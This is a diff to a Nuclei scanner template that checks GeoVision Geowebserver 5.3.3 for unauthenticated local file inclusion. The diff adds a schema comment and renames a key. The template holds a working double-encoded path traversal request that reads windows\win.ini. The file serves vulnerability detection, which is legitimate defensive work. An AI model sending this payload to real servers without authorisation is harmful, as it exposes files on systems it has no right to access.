@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: geowebserver-lfi
 info:
   name: GeoVision Geowebserver 5.3.3 - LFI
@@ -6,7 +7,7 @@ info:
   description: A vulnerability in GeoVision Geowebserver allows remote unauthenticated attackers to disclose the content of locally stored files.
   reference: https://packetstormsecurity.com/files/163860/geovisiongws533-lfixssxsrfexec.txt
   tags: geowebserver,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini"
